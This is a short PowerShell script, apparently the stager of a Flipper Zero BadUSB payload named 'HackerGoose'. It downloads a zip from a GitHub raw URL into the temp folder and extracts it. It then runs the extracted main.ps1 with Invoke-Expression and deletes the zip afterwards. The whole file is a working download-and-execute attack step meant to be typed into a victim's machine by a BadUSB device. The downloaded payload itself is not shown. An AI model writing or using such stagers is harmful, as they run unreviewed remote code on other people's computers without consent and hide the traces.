# Set the temporary directory
$TempDirectory = $env:TEMP

# Specify the URL to the zip file
$ZipUrl = 'https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/HackerGoose/HackerGoose.zip'

# Set TLS version to 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download the zip file
Invoke-WebRequest -Uri $ZipUrl -OutFile "$TempDirectory\HackerGoose.zip"

# Extract the contents of the "hg" folder directly into the temporary directory
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("$TempDirectory\HackerGoose.zip", $TempDirectory)

# Build the full path to main.ps1
$mainScriptPath = Join-Path $TempDirectory "hg\main.ps1"

# Run the main.ps1 script
Invoke-Expression -Command $mainScriptPath
Remove-Item -Path (Join-Path $env:TEMP "HackerGoose.zip")
